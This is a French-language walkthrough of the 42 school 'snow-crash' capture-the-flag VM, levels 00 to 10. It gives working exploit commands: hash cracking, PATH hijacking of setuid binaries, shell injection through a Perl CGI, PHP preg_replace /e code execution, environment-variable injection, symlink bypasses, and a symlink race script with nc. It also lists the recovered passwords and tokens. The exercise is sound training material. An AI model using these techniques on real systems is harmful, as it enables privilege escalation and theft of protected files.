# snow-crash

Ce projet est principalement axé sur le reverse engineering, à travers une série de défis allant du level00 au level14, incluant des exercices bonus. Vous serez amené à analyser des binaires, exploiter des vulnérabilités comme les race conditions, contourner des mécanismes de sécurité et réaliser des escalades de privilèges pour accéder à des ressources normalement inaccessibles. Ce projet fait partie de la spécialisation cybersécurité de 42, visant à renforcer vos compétences en sécurité informatique et en analyse de vulnérabilités.

## Mandatory part
### level-00
```bash
level00@SnowCrash: find / -user "flag00" 2> /dev/null 
/usr/sbin/john
/rofs/usr/sbin/john
level00@SnowCrash:~$ cat /usr/sbin/john 
cdiiddwpgswtgt
```

https://www.dcode.fr/chiffre-cesar
nottoohardhere

```bash
level00@SnowCrash: su flag00
Password: nottoohardhere
Don't forget to launch getflag !
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
```
### level-01
```bash
level01@SnowCrash:~$ cat /etc/passwd


flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

vim hash.txt
```
utilisation de johntheripper
```bash                                                                                                              
john hash.txt 
Created directory: /home/ju/.john
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2])
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 642 candidates buffered for the current salt, minimum 3072 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst
abcdefg          (flag01)     
1g 0:00:00:00 DONE 2/3 (2025-01-15 17:11) 50.00g/s 3750Kp/s 3750Kc/s 3750KC/s 123456..2nesbitt
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
on recupere abcdefg

```bash
level01@SnowCrash:~$ su flag01
Password: abcdefg
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
flag01@SnowCrash:~$
```
### level-02

```bash
└─$ scp -P 4242 level02@192.168.1.36:/home/user/level02/level02.pcap .                           


wireshark level02.pcap 
```
ft_wandr...NDRel.L0L(0d)(000d0a)(01)

7f

ft_wandr...NDRel.L0L(0d)(000d0a)(01)
ft_waNDReL0L(0d)(000d0a)(01) 
ft_waNDReL0L
```bash
level02@SnowCrash:~$ su flag02
Password: 
Don't forget to launch getflag !
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
flag02@SnowCrash:~$ 
```

### level-03

Une fois l executable decompilé avec ghidra
```c
int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```

("/usr/bin/env echo Exploit me");

on voit un appel systeme sur echo 
on change le path pour executer la commande getflag
whereis getflag
changement du path: echo '/bin/getflag' > '/tmp/echo'
unset PATH
export PATH=/tmp
./level03

flag='qi0maab88jeaj46qoumi7maus'

### level-04
```bash
level04@SnowCrash:~$ cat level04.pl
```
```perl
#!/usr/bin/perl
#localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
script perle vulnerable a l'injection de commande donc :
```bash
level04@SnowCrash:~$ curl 'localhost:4747/level04.pl?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
### level-05
``` bash
level05@SnowCrash:~$ find / -user "flag05" 2>/dev/null 
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh 
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$ su level06
Password: 
level06@SnowCrash:~$
```
### level-06

```bash
level06@SnowCrash:~$ cat level06.php
```
```php
<?php

function y($m) 
{
     $m = preg_replace("/\./", " x ", $m); 
     $m = preg_replace("/@/", " y", $m); 
     return $m;
}

function x($y, $z) 
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a; 
}

    $r = x($argv[1], $argv[2]); 
    print $r;
    
?>
```
On remarque dans le script php l'option /e disponible avant PHP 5.5.0 qui ouvre un acces au RCE
donc plus qu'a injecter du code tout en respectant la regex.

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

### level-07

```bash
ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

En passant le bin sur ghidra on voit:
```c
int main(int argc,char **argv,char **envp)
{
	char *param2;
    int iVar1;
    char *buffer;
    gid_t gid;
    uid_t uid;
  	char *local_1c;
  	__gid_t local_18;
  	__uid_t local_14;
	
  	local_18 = getegid();
  	local_14 = geteuid();
  	setresgid(local_18,local_18,local_18);
  	setresuid(local_14,local_14,local_14);
  	local_1c = (char *)0x0;
  	param2 = getenv("LOGNAME");
  	asprintf(&local_1c,"/bin/echo %s",param2);
  	iVar1 = system(local_1c);
  	return iVar1;
}
```

```c
  	param2 = getenv("LOGNAME");
  	asprintf(&local_1c,"/bin/echo %s",param2);
```
en voyant ces ligne en en deduit:

```bash
level07@SnowCrash:~$ echo $LOGNAME
level07
level07@SnowCrash:~$ export LOGNAME='$(getflag)'
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### level-08
```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

une fois le code decompile avec ghidra on obtient:
```c

int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  undefined4 *in_stack_00000008;
  int fd;
  int rc;
  char buf [1024];
  undefined local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc == 1) {
    printf("%s [file to read]\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = strstr((char *)in_stack_00000008[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __fd = open((char *)in_stack_00000008[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",in_stack_00000008[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return sVar2;
}
```

on y voit une verification du nom fichier. Si il contient "token" ou non.
Dans le cas contraire le fichier s'ouvre

```c
pcVar1 = strstr((char *)in_stack_00000008[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
```
Creation d'un lien symbolique pour contourner la restriction
```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/flag
level08@SnowCrash:~$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

### level09

Comme d'habitude un executable une fois sur ghidra on obtient:
```c

size_t main(int param_1,int param_2)

{
  char cVar1;
  bool bVar2;
  long lVar3;
  size_t sVar4;
  char *pcVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  int in_GS_OFFSET;
  byte bVar9;
  uint local_120;
  undefined local_114 [256];
  int local_14;
  
  bVar9 = 0;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  bVar2 = false;
  local_120 = 0xffffffff;
  lVar3 = ptrace(PTRACE_TRACEME,0,1,0);
  if (lVar3 < 0) {
    puts("You should not reverse this");
    sVar4 = 1;
  }
  else {
    pcVar5 = getenv("LD_PRELOAD");
    if (pcVar5 == (char *)0x0) {
      iVar6 = open("/etc/ld.so.preload",0);
      if (iVar6 < 1) {
         iVar6 = syscall_open("/proc/self/maps",0);
         if (iVar6 == -1) {
           fwrite("/proc/self/maps is unaccessible, probably a LD_PRELOAD attempt exit..\n",1,0x46,
                   stderr);
           sVar4 = 1;
         }
         else {
           do {
             do {
                while( true ) {
                  sVar4 = syscall_gets(local_114,0x100,iVar6);
                  if (sVar4 == 0) goto LAB_08048a77;
                  iVar7 = isLib(local_114,&DAT_08048c2b);
                  if (iVar7 == 0) break;
                  bVar2 = true;
                }
             } while (!bVar2);
             iVar7 = isLib(local_114,&DAT_08048c30);
             if (iVar7 != 0) {
                if (param_1 == 2) goto LAB_08048996;
                sVar4 = fwrite("You need to provied only one arg.\n",1,0x22,stderr);
                goto LAB_08048a77;
             }
             iVar7 = afterSubstr(local_114,"00000000 00:00 0");
           } while (iVar7 != 0);
           sVar4 = fwrite("LD_PRELOAD detected through memory maps exit ..\n",1,0x30,stderr);
         }
      }
      else {
         fwrite("Injection Linked lib detected exit..\n",1,0x25,stderr);
         sVar4 = 1;
      }
    }
    else {
      fwrite("Injection Linked lib detected exit..\n",1,0x25,stderr);
      sVar4 = 1;
    }
  }
LAB_08048a77:
  if (local_14 == *(int *)(in_GS_OFFSET + 0x14)) {
    return sVar4;
  }
                      /* WARNING: Subroutine does not return */
  __stack_chk_fail();
LAB_08048996:
  local_120 = local_120 + 1;
  uVar8 = 0xffffffff;
  pcVar5 = *(char **)(param_2 + 4);
  do {
    if (uVar8 == 0) break;
    uVar8 = uVar8 - 1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + (uint)bVar9 * -2 + 1;
  } while (cVar1 != '\0');
  if (~uVar8 - 1 <= local_120) goto code_r0x080489ca;
  putchar((int)*(char *)(local_120 + *(int *)(param_2 + 4)) + local_120);
  goto LAB_08048996;
code_r0x080489ca:
  sVar4 = fputc(10,stdout);
  goto LAB_08048a77;
}

```
on voit cette partie ou en executant le binaire avec le file token le resultat donne est tpmhr
```c
  putchar((int)*(char *)(local_120 + *(int *)(param_2 + 4)) + local_120);
```
On a un decalage ne n = n + 1 pour chaque caractere de token

```
t = t
o = p
k = n
e = h
n = r
```
```bash
level09@SnowCrash:~$ cat token
f4kmm6p|=�p�n��DB�Du{��
```
plus qu'a decoder le flag, pour cela nous avons coder un script simpliste en C

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main()
{
    int f = open("token", O_RDONLY);
    if (f < 0)
        return (write (2, "Error\n", 6), 1);
    char c;
    for (int i = 0; read(f, &c, 1); i++)
        printf("%c", c - i);
    return (0);
}
```
```bash
scp -P 4242 level09@192.168.1.82:/home/user/level09/token /Users/user/Desktop/token
```
puis on execute notre script avec le fichier en question et on obtient:

f3iji1ju5yuevaus41q1afiuq

```bash
level09@SnowCrash:~$ su flag09
Password:
Don't forget to launch getflag !
flag09@SnowCrash:~$ getflag
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
```

## Bonus part

### level-10

Resultat avec ghidra:
```c
/* WARNING: Unknown calling convention */

int main(int argc,char **argv)

{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  undefined4 *in_stack_00000008;
  char *file;
  char *host;
  int fd;
  int ffd;
  int rc;
  char buffer [4096];
  sockaddr_in sin;
  undefined local_1024 [4096];
  sockaddr local_24;
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar6 = (char *)in_stack_00000008[1];
  __cp = (char *)in_stack_00000008[2];
  iVar2 = access((char *)in_stack_00000008[1],4);
  if (iVar2 == 0) {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data[2] = '\0';
    local_24.sa_data[3] = '\0';
    local_24.sa_data[4] = '\0';
    local_24.sa_data[5] = '\0';
    local_24.sa_data[6] = '\0';
    local_24.sa_data[7] = '\0';
    local_24.sa_data[8] = '\0';
    local_24.sa_data[9] = '\0';
    local_24.sa_data[10] = '\0';
    local_24.sa_data[0xb] = '\0';
    local_24.sa_data[0xc] = '\0';
    local_24.sa_data[0xd] = '\0';
    local_24.sa_family = 2;
    local_24.sa_data[0] = '\0';
    local_24.sa_data[1] = '\0';
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }
  else {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}
```
Le but est de contourner la première condition d'accès au fichier en utilisant un lien symbolique, un peu comme pour le level-08. Cette fois-ci, nous allons créer un premier lien symbolique vers deux fichiers auxquels nous avons accès. Ensuite, il faudra créer un deuxième lien symbolique pointant vers le fichier token, afin de pouvoir y accéder. L'objectif est de déclencher une race condition en manipulant les accès en fonction des fichiers que nous pouvons manipuler.
Voici le script utilisé pour ce niveau
```bash
#!/bin/bash

echo "dummy" > /tmp/dummy
touch /tmp/token_content
nc -l 6969 > /tmp/token_content
sleep 1

(while true; do
    ln -sf /tmp/dummy /tmp/exploit
    ln -sf /home/user/level10/token /tmp/exploit
done)

while true; do
    ./level10 /tmp/exploit 127.0.0.1 2>/dev/null
    
    if [ -s /tmp/token_content ]; then
        echo "Token capturé !"
        cat /tmp/token_content
        break
    fi
done
```
